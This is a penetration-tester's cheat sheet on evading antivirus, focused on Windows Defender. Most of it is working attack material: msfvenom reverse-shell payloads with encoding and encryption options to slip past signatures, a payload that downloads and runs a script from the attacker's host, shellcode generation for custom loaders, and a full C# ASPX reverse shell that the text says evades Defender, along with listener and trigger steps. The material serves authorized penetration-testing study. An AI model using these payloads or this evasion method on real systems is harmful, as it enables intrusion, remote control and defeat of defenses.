---
tags:
  - Defense_Evasion
  - Foundational
  - Windows
---

## AV Evasion Fundamentals
resources: [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)

> [!info] Understand AV detection to develop effective evasion. Modern AV uses multiple detection layers.

### Antivirus Detection Methods
> [!important] Detection layers to bypass:
> - **Signature-based** - Pattern matching against known malware signatures
> - **Heuristic** - Behavioral patterns and suspicious characteristics
> - **Behavioral** - Runtime monitoring of process actions
> - **Machine Learning** - Statistical models trained on malware samples
> - **Sandboxing** - Execute in isolated environment to observe behavior

### Simulating Target Environment

#### Install Windows Defender
> [!tip] Windows Defender is default on Windows 10/11. Ensure real-time protection is enabled for testing.

```powershell
# Check Defender status
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled
```

#### Update Definitions
```powershell
Update-MpSignature
```

### Locating Signatures in Files

#### DefenderCheck Tool [Local]
> [!tip] Identifies which bytes in file trigger Defender detection.

```powershell
DefenderCheck.exe <PayloadFile>
```

#### ThreatCheck [alternative]
```powershell
ThreatCheck.exe -f <PayloadFile>
```

#### Manual Signature Finding
> [!tip] Split file in half, test each half, repeat until signature located.

```powershell
# Split file
$bytes = [System.IO.File]::ReadAllBytes("payload.exe")
$half = $bytes.Length / 2
$firstHalf = $bytes[0..($half-1)]
$secondHalf = $bytes[$half..($bytes.Length-1)]
[System.IO.File]::WriteAllBytes("first.bin", $firstHalf)
[System.IO.File]::WriteAllBytes("second.bin", $secondHalf)
```

### Payload Encoding and Encryption

#### List Available Encoders
```bash
msfvenom --list encoders
```

#### Shikata Ga Nai Encoder (x86)
> [!tip] Polymorphic XOR encoder. Multiple iterations increase uniqueness but are heavily signatured.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
```

#### XOR Dynamic Encoder (x64)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -e x64/xor_dynamic -i 5 -f exe -o payload.exe
```

#### List Available Encryptors
```bash
msfvenom --list encrypt
```

#### AES Encryption
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> --encrypt aes256 --encrypt-key <32ByteKey> -f elf -o payload.elf
```

#### XOR Encryption
```bash
msfvenom -p windows/x64/exec CMD="powershell -ep bypass -c IEX(curl <AttackerIP>/script.ps1)" --encrypt xor --encrypt-key <Key> -f exe -o payload.exe
```

### Generate Raw Shellcode for Custom Loaders

#### Raw Shellcode (Binary)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f raw -o shellcode.bin
```

#### C# Format
```bash
msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp
```

#### Python Format
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f python
```

#### PowerShell Format
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f psh
```

### ASPX Reverse Shells (IIS)

> [!warning] msfvenom ASPX payloads are heavily signatured and will be caught by Defender. Use a custom C# ASPX shell instead.

#### Test ASPX Execution
> Upload `cmdasp.aspx` web shell to verify IIS processes ASPX files before attempting reverse shell.

```bash
locate cmdasp.aspx
# Usually at /usr/share/webshells/aspx/cmdasp.aspx
```

> Browse to `http://<Target>/cmdasp.aspx` - if you get a command form, ASPX execution works.

#### Test Outbound Connectivity [Remote]
> From the web shell, verify the target can reach your listener:

```powershell
powershell -c "Test-NetConnection <LHOST> -Port <LPORT>"
```

> If `TcpTestSucceeded: True`, outbound works and AV is killing the payload.

#### Custom ASPX Reverse Shell
> This C# reverse shell evades Defender signatures better than msfvenom output.

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    using(TcpClient c = new TcpClient("<LHOST>", <LPORT>))
    {
        using(Stream s = c.GetStream())
        {
            StreamReader r = new StreamReader(s);
            StreamWriter w = new StreamWriter(s);
            w.AutoFlush = true;
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += (sender2, e2) => { w.WriteLine(e2.Data); };
            p.ErrorDataReceived += (sender3, e3) => { w.WriteLine(e3.Data); };
            p.Start();
            p.BeginOutputReadLine();
            p.BeginErrorReadLine();
            while(true)
            {
                string cmd = r.ReadLine();
                if(cmd == null) break;
                p.StandardInput.WriteLine(cmd);
            }
        }
    }
}
</script>
```

#### Start Listener [Local]
```bash
rlwrap nc -lvnp <LPORT>
```

#### Trigger Shell
> Browse to `http://<Target>/shell.aspx` in a browser. The page load triggers the reverse shell.
